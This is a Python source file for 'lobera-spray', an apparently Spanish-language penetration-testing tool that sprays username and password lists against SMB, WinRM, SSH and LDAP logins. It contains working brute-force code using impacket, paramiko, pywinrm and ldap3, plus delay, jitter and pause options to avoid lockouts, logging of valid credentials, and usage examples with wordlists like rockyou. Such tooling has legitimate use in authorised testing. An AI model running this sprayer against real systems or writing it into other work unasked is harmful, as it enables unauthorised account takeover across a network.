#!/usr/bin/env python3
# tools/spray/main.py
"""
lobera-spray — Sprayer de credenciales multiprotocolo.

Protocolos soportados:
  smb    — autenticación NTLM contra SMB (445)
  winrm  — autenticación NTLM contra WinRM (5985/5986)
  ssh    — autenticación SSH por contraseña o clave
  ldap   — bind NTLM contra LDAP (389/636)
  all    — prueba los cuatro en orden

Modos de uso:
  lobera-spray smb   -t 10.10.10.5 -u admin -P passwords.txt
  lobera-spray winrm -t 10.10.10.5 -U users.txt -p Password123 -d CORP.LOCAL
  lobera-spray ssh   -t 10.10.10.5 -U users.txt -P passwords.txt --delay 2
  lobera-spray ldap  -t 10.10.10.5 -u USER -P passwords.txt -d CORP.LOCAL
  lobera-spray all   -t 10.10.10.5 -u admin -p Pass123 -d CORP.LOCAL

Medidas anti-lockout:
  --delay    Segundos entre intentos (default: 1)
  --jitter   Variación aleatoria adicional en segundos (default: 0)
  --rounds   Máximo de intentos por usuario antes de pausa (default: sin límite)
  --pause    Segundos de pausa entre rondas (default: 300)
"""

import sys
import os
import time
import random
import datetime

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.output import console


# ── Utilidades ────────────────────────────────────────────────────────────────

def _load_lines(path):
    """Carga líneas de un fichero, ignorando vacías y comentarios."""
    if not path:
        return []
    with open(path, "r", errors="replace") as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]


def _wait(delay, jitter):
    """Espera delay + jitter aleatorio."""
    pausa = delay + random.uniform(0, jitter)
    if pausa > 0:
        time.sleep(pausa)


def _ts():
    return datetime.datetime.now().strftime("%H:%M:%S")


def _resultado(proto, target, user, password, ok, output_file):
    """Imprime y registra resultado."""
    ts = _ts()
    if ok:
        msg = f"[bold green]✓ VÁLIDO[/bold green] [{proto}] {user}:{password}"
        console.print(f"  [{ts}] {msg}")
    else:
        msg = f"[dim]✗[/dim] [{proto}] {user}:{password}"
        console.print(f"  [{ts}] {msg}")

    if output_file and ok:
        with open(output_file, "a") as f:
            f.write(f"[{ts}] {proto} {target} {user}:{password}\n")

    return ok


# ── SMB ───────────────────────────────────────────────────────────────────────

def _try_smb(target, port, domain, user, password):
    """Intenta autenticación SMB con impacket."""
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(target, target, sess_port=int(port), timeout=5)
        conn.login(user, password, domain=domain)
        conn.logoff()
        return True
    except Exception as e:
        err = str(e).lower()
        # Distinguir error de credenciales de error de red
        if "logon_failure" in err or "wrong password" in err or "status_logon_failure" in err:
            return False
        if "locked" in err or "account_locked" in err:
            return None   # None = cuenta bloqueada
        return False


def spray_smb(target, port, domain, usuarios, passwords, delay, jitter, rounds, pause, output_file):
    console.print(f"  [bold cyan]Protocolo:[/bold cyan] SMB  →  {target}:{port}")

    validos = []
    intentos = 0

    for idx_p, password in enumerate(passwords):
        if rounds and idx_p > 0 and idx_p % rounds == 0:
            console.print(f"  [yellow]Pausa anti-lockout: {pause}s[/yellow]")
            time.sleep(pause)

        for user in usuarios:
            estado = _try_smb(target, port, domain, user, password)
            if estado is None:
                console.print(f"  [{_ts()}] [red]! CUENTA BLOQUEADA:[/red] {user}")
                continue
            ok = _resultado("SMB", target, user, password, estado, output_file)
            if ok:
                validos.append((user, password))
            intentos += 1
            _wait(delay, jitter)

    return validos


# ── WinRM ─────────────────────────────────────────────────────────────────────

def _try_winrm(target, port, domain, user, password, ssl):
    """Intenta autenticación WinRM con pywinrm."""
    try:
        import winrm
        schema = "https" if ssl else "http"
        endpoint = f"{schema}://{target}:{port}/wsman"
        sess = winrm.Session(
            endpoint,
            auth=(f"{domain}\\{user}" if domain else user, password),
            transport="ntlm",
            server_cert_validation="ignore",
            read_timeout_sec=5,
            operation_timeout_sec=5,
        )
        # Comando mínimo para verificar acceso
        r = sess.run_cmd("whoami")
        return r.status_code == 0
    except Exception as e:
        err = str(e).lower()
        if "401" in err or "unauthorized" in err or "access denied" in err:
            return False
        return False


def spray_winrm(target, port, domain, ssl, usuarios, passwords, delay, jitter, rounds, pause, output_file):
    console.print(f"  [bold cyan]Protocolo:[/bold cyan] WinRM  →  {target}:{port}")

    validos = []

    for idx_p, password in enumerate(passwords):
        if rounds and idx_p > 0 and idx_p % rounds == 0:
            console.print(f"  [yellow]Pausa anti-lockout: {pause}s[/yellow]")
            time.sleep(pause)

        for user in usuarios:
            ok = _try_winrm(target, port, domain, user, password, ssl)
            _resultado("WinRM", target, user, password, ok, output_file)
            if ok:
                validos.append((user, password))
            _wait(delay, jitter)

    return validos


# ── SSH ───────────────────────────────────────────────────────────────────────

def _try_ssh(target, port, user, password, key_file):
    """Intenta autenticación SSH con paramiko."""
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        kwargs = dict(
            hostname=target, port=int(port), username=user,
            timeout=5, allow_agent=False, look_for_keys=False,
        )
        if key_file:
            kwargs["key_filename"] = key_file
        else:
            kwargs["password"] = password
        client.connect(**kwargs)
        client.close()
        return True
    except Exception as e:
        err = str(e).lower()
        if "authentication failed" in err or "no authentication" in err:
            return False
        return False


def spray_ssh(target, port, usuarios, passwords, key_file, delay, jitter, output_file):
    console.print(f"  [bold cyan]Protocolo:[/bold cyan] SSH  →  {target}:{port}")

    validos = []

    for password in passwords:
        for user in usuarios:
            ok = _try_ssh(target, port, user, password, key_file)
            _resultado("SSH", target, user, password, ok, output_file)
            if ok:
                validos.append((user, password))
            _wait(delay, jitter)

    return validos


# ── LDAP ──────────────────────────────────────────────────────────────────────

def _try_ldap(target, port, domain, user, password, ssl):
    """Intenta bind NTLM contra LDAP con ldap3."""
    try:
        import ldap3
        server = ldap3.Server(target, port=int(port), use_ssl=ssl, connect_timeout=5)
        user_dn = f"{domain}\\{user}" if domain else user
        conn = ldap3.Connection(
            server, user=user_dn, password=password,
            authentication=ldap3.NTLM, auto_bind=True,
            receive_timeout=5,
        )
        conn.unbind()
        return True
    except Exception as e:
        err = str(e).lower()
        if "invalidcredentials" in err or "52e" in err or "530" in err or "533" in err:
            return False
        if "775" in err or "locked" in err:
            return None  # cuenta bloqueada
        return False


def spray_ldap(target, port, domain, ssl, usuarios, passwords, delay, jitter, rounds, pause, output_file):
    console.print(f"  [bold cyan]Protocolo:[/bold cyan] LDAP  →  {target}:{port}")

    validos = []

    for idx_p, password in enumerate(passwords):
        if rounds and idx_p > 0 and idx_p % rounds == 0:
            console.print(f"  [yellow]Pausa anti-lockout: {pause}s[/yellow]")
            time.sleep(pause)

        for user in usuarios:
            estado = _try_ldap(target, port, domain, user, password, ssl)
            if estado is None:
                console.print(f"  [{_ts()}] [red]! CUENTA BLOQUEADA:[/red] {user}")
                continue
            _resultado("LDAP", target, user, password, estado, output_file)
            if estado:
                validos.append((user, password))
            _wait(delay, jitter)

    return validos


# ── Modo ALL ──────────────────────────────────────────────────────────────────

def spray_all(args, usuarios, passwords):
    validos = []
    validos += spray_smb(
        args.target, args.smb_port, args.domain,
        usuarios, passwords,
        args.delay, args.jitter, args.rounds, args.pause, args.output
    )
    validos += spray_winrm(
        args.target, args.winrm_port, args.domain, args.ssl,
        usuarios, passwords,
        args.delay, args.jitter, args.rounds, args.pause, args.output
    )
    validos += spray_ssh(
        args.target, args.ssh_port,
        usuarios, passwords, args.key_file,
        args.delay, args.jitter, args.output
    )
    validos += spray_ldap(
        args.target, args.ldap_port, args.domain, args.ssl,
        usuarios, passwords,
        args.delay, args.jitter, args.rounds, args.pause, args.output
    )
    return validos


# ── Resumen ───────────────────────────────────────────────────────────────────

def _resumen(validos, output_file):
    console.print()
    if validos:
        console.print(f"  [bold green]Credenciales válidas encontradas: {len(validos)}[/bold green]")
        for user, pwd in validos:
            console.print(f"    [green]→[/green] {user}:{pwd}")
    else:
        console.print("  [dim]No se encontraron credenciales válidas.[/dim]")

    if output_file and validos:
        console.print(f"  [dim]Resultados guardados en: {output_file}[/dim]")


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser():
    import argparse

    parser = argparse.ArgumentParser(
        prog="lobera-spray",
        description="Sprayer de credenciales multiprotocolo con medidas anti-lockout",
    )
    subs = parser.add_subparsers(dest="proto", metavar="protocolo")

    # ── Argumentos comunes ────────────────────────────────────────────────────
    def _comunes(p):
        p.add_argument("-t", "--target",   required=True,  help="IP/hostname del objetivo")
        p.add_argument("-u", "--user",     default=None,   help="Usuario único")
        p.add_argument("-U", "--user-file",default=None,   dest="user_file", help="Fichero de usuarios (uno por línea)")
        p.add_argument("-p", "--password", default=None,   help="Contraseña única")
        p.add_argument("-P", "--pass-file",default=None,   dest="pass_file", help="Fichero de contraseñas (uno por línea)")
        p.add_argument("-d", "--domain",   default="",     help="Dominio FQDN (ej: CORP.LOCAL)")
        p.add_argument("--delay",          default=1.0, type=float, help="Segundos entre intentos (default: 1)")
        p.add_argument("--jitter",         default=0.0, type=float, help="Jitter aleatorio máximo en segundos (default: 0)")
        p.add_argument("--rounds",         default=0,   type=int,   help="Intentos por ronda antes de pausar (default: sin límite)")
        p.add_argument("--pause",          default=300, type=int,   help="Segundos de pausa entre rondas (default: 300)")
        p.add_argument("--output",         default=None,   help="Fichero donde guardar credenciales válidas")
        p.add_argument("--ssl",            action="store_true", default=False, help="Usar SSL/TLS (LDAPS, HTTPS)")

    # ── smb ───────────────────────────────────────────────────────────────────
    p_smb = subs.add_parser("smb", help="Spray contra SMB (NTLM)")
    _comunes(p_smb)
    p_smb.add_argument("--smb-port",  default=445, type=int, dest="smb_port", help="Puerto SMB (default: 445)")

    # ── winrm ─────────────────────────────────────────────────────────────────
    p_wr = subs.add_parser("winrm", help="Spray contra WinRM (NTLM)")
    _comunes(p_wr)
    p_wr.add_argument("--winrm-port", default=5985, type=int, dest="winrm_port",
                      help="Puerto WinRM (5985=HTTP, 5986=HTTPS, default: 5985)")

    # ── ssh ───────────────────────────────────────────────────────────────────
    p_ssh = subs.add_parser("ssh", help="Spray contra SSH")
    _comunes(p_ssh)
    p_ssh.add_argument("--ssh-port",  default=22, type=int, dest="ssh_port", help="Puerto SSH (default: 22)")
    p_ssh.add_argument("--key-file",  default=None, dest="key_file", help="Clave privada SSH (en lugar de contraseña)")

    # ── ldap ──────────────────────────────────────────────────────────────────
    p_ldap = subs.add_parser("ldap", help="Spray contra LDAP (bind NTLM)")
    _comunes(p_ldap)
    p_ldap.add_argument("--ldap-port", default=389, type=int, dest="ldap_port",
                        help="Puerto LDAP (389=sin SSL, 636=LDAPS, default: 389)")

    # ── all ───────────────────────────────────────────────────────────────────
    p_all = subs.add_parser("all", help="Spray contra todos los protocolos")
    _comunes(p_all)
    p_all.add_argument("--smb-port",   default=445,  type=int, dest="smb_port")
    p_all.add_argument("--winrm-port", default=5985, type=int, dest="winrm_port")
    p_all.add_argument("--ssh-port",   default=22,   type=int, dest="ssh_port")
    p_all.add_argument("--ldap-port",  default=389,  type=int, dest="ldap_port")
    p_all.add_argument("--key-file",   default=None, dest="key_file")

    return parser


def _banner():
    from tools.common import banner, panel_info, tabla_modos, tabla_flags, ejemplos

    banner("lobera-spray  —  Sprayer multiprotocolo con anti-lockout")

    tabla_modos([
        ("smb",   "Autenticación NTLM contra SMB  (puerto 445)"),
        ("winrm", "Autenticación NTLM contra WinRM  (5985 HTTP / 5986 HTTPS)"),
        ("ssh",   "Autenticación SSH por contraseña o clave privada"),
        ("ldap",  "Bind NTLM contra LDAP/LDAPS  (389 / 636)"),
        ("all",   "Prueba los cuatro protocolos en orden"),
    ])

    tabla_flags([
        ("-t / --target",   "IP",   "IP o hostname del objetivo"),
        ("-u / --user",     "str",  "Usuario único"),
        ("-U / --user-file","file", "Fichero de usuarios  (uno por línea)"),
        ("-p / --password", "str",  "Contraseña única"),
        ("-P / --pass-file","file", "Fichero de contraseñas  (uno por línea)"),
        ("-d / --domain",   "FQDN", "Dominio  (ej: CORP.LOCAL)"),
        ("--delay",         "float","Segundos entre intentos  (default: 1)"),
        ("--jitter",        "float","Variación aleatoria adicional  (default: 0)"),
        ("--rounds",        "int",  "Intentos por ronda antes de pausar  (default: sin límite)"),
        ("--pause",         "int",  "Segundos de pausa entre rondas  (default: 300)"),
        ("--output",        "file", "Guardar credenciales válidas"),
        ("--ssl",           "flag", "Forzar SSL/TLS  (LDAPS, WinRM HTTPS)"),
        ("--key-file",      "file", "Clave privada SSH  (modo ssh)"),
    ], titulo="Opciones comunes")

    panel_info("⚠  Anti-lockout", [
        "El spray puede bloquear cuentas si la política de dominio es estricta.",
        "Recomendación: [bold]--delay 30 --jitter 10 --rounds 1 --pause 1800[/bold]",
        "Esto hace 1 intento por usuario, pausa 30 min entre contraseñas.",
        "Consulta la política de bloqueo antes de lanzar: [bold]lobera ldap -t DC -u user -p pass -d DOM --script enum/password_policy[/bold]",
    ])

    ejemplos([
        "# Spray SMB con lista de usuarios y contraseñas, anti-lockout básico",
        "lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 2 --jitter 1",
        "",
        "# Un usuario, varias contraseñas contra WinRM",
        "lobera-spray winrm -t 10.10.10.5 -u administrador -P rockyou_top100.txt -d CORP.LOCAL",
        "",
        "# SSH con clave privada",
        "lobera-spray ssh -t 10.10.10.5 -U users.txt --key-file id_rsa",
        "",
        "# LDAP con pausa entre rondas  (1 pass/ronda, 30 min entre rondas)",
        "lobera-spray ldap -t 10.10.10.5 -U users.txt -P passes.txt -d CORP.LOCAL --rounds 1 --pause 1800",
        "",
        "# Todos los protocolos de una vez",
        "lobera-spray all -t 10.10.10.5 -u admin -p 'Winter2024!' -d CORP.LOCAL",
    ])


def _advertencia_lockout():
    console.print("  [bold yellow]⚠  ADVERTENCIA:[/bold yellow] El spray de credenciales puede bloquear cuentas.")
    console.print("  [dim]Usa --delay, --jitter y --rounds para reducir el riesgo.[/dim]\n")


def main():
    parser = build_parser()
    args   = parser.parse_args()

    _banner()

    if not args.proto:
        _banner()
        return

    _banner()
    _advertencia_lockout()

    # Cargar listas
    usuarios  = [args.user]  if args.user  else _load_lines(getattr(args, "user_file", None))
    passwords = [args.password] if args.password else _load_lines(getattr(args, "pass_file", None))

    if not usuarios:
        console.print("  [red]✗ Especifica -u USER o -U users.txt[/red]")
        sys.exit(1)
    if not passwords and getattr(args, "key_file", None) is None:
        console.print("  [red]✗ Especifica -p PASS o -P passwords.txt[/red]")
        sys.exit(1)

    console.print(f"  [bold]Objetivo:[/bold]    {args.target}")
    console.print(f"  [bold]Usuarios:[/bold]    {len(usuarios)}")
    if passwords:
        console.print(f"  [bold]Contraseñas:[/bold] {len(passwords)}")
    console.print(f"  [bold]Delay:[/bold]       {args.delay}s + jitter {args.jitter}s\n")

    validos = []

    try:
        if args.proto == "smb":
            validos = spray_smb(
                args.target, args.smb_port, args.domain,
                usuarios, passwords,
                args.delay, args.jitter, args.rounds, args.pause, args.output
            )

        elif args.proto == "winrm":
            validos = spray_winrm(
                args.target, args.winrm_port, args.domain, args.ssl,
                usuarios, passwords,
                args.delay, args.jitter, args.rounds, args.pause, args.output
            )

        elif args.proto == "ssh":
            validos = spray_ssh(
                args.target, args.ssh_port,
                usuarios, passwords, getattr(args, "key_file", None),
                args.delay, args.jitter, args.output
            )

        elif args.proto == "ldap":
            validos = spray_ldap(
                args.target, args.ldap_port, args.domain, args.ssl,
                usuarios, passwords,
                args.delay, args.jitter, args.rounds, args.pause, args.output
            )

        elif args.proto == "all":
            # Asegurarse de que todos los atributos de puerto existen
            if not hasattr(args, "smb_port"):    args.smb_port    = 445
            if not hasattr(args, "winrm_port"):  args.winrm_port  = 5985
            if not hasattr(args, "ssh_port"):    args.ssh_port    = 22
            if not hasattr(args, "ldap_port"):   args.ldap_port   = 389
            if not hasattr(args, "key_file"):    args.key_file    = None
            validos = spray_all(args, usuarios, passwords)

    except KeyboardInterrupt:
        console.print("\n  [yellow]Spray interrumpido[/yellow]")

    _resumen(validos, args.output)


if __name__ == "__main__":
    main()
